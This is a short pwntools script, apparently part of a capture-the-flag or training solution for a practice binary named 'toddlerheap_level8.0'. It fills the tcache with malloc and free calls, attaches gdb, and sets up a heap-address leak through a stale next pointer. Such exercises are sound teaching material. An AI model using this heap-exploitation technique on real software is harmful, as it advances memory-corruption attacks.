from pwn import * 

binary = './toddlerheap_level8.0_patched'

p = process(binary)
s = '''
b malloc
b free
'''



# the next pointer is left in a chunk after freeing and remalloc'ing. Thus leak the heap address 
for i in range(0, 7):
	p.sendline(f"malloc {i} 24")
p.sendline(f"malloc 7 24")
p.sendline(f"malloc 8 24")
for i in range(0, 7):
	p.sendline(f"free {i}")

gdb.attach(p, s)


p.sendline(f"free 7")

p.sendline(f"malloc 9 1024")




p.interactive()

